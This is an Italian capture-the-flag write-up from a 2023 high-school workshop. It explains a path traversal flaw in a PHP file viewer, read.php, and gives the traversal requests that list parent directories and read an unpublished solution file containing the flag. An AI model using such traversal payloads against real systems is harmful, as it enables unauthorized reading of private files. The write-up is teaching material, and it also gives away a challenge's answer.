# 4th HighSchools CTF Workshop - Perugia 2023

## [web] Trova le soluzioni 2

Il sito è scritto in PHP e permette di visualizzare le soluzioni delle verifiche pubblicate passando il nome del file come parametro `GET` (es `/read.php?file=20231204.txt`).

## Vulnerabilità

### Path Traversal

L'accesso a un file può essere eseguito in due modi: mediante un percorso "assoluto" (es `C:\Users\federico\Desktop\Hello.txt`) o attraverso un percorso "relativo" alla cartella in cui ci si trova (es se si è in `C:\Users\federico\Desktop\` il percorso relativo è `.\Hello.txt`).  
Per navigare nella cartella "padre" a quella in cui ci si trova bisogna utilizzare "`..`" (es scrivere `C:\Users\federico\Desktop\..\Documenti` equivarrà a `C:\Users\federico\Documenti`).  
Pertanto, passando al parametro `file` del file PHP `read.php` un percorso "relativo" differente a quello previsto dall'applicativo si genererà una vulnerabilità di tipo `Path Traversal`.

## Soluzione

Analizzando un link attuale (es `/read.php?file=20231204.txt`) sarà possibile modificarlo per andare a leggere i file presenti in una cartella differente:  
Eseguendo `/read.php?file=..` si visualizzerà l'elenco dei file presenti nella cartella padre:

```txt
.
..
dapubblicare
soluzioni
```

Eseguendo `/read.php?file=../dapubblicare` si visualizzerà l'elenco dei file presenti nella cartella "dapubblicare":

```txt
.
..
20240310.txt
20240509.txt
```

Eseguendo `/read.php?file=../dapubblicare/20240310.txt` si visualizzerà la soluzione della verifica contente la flag.
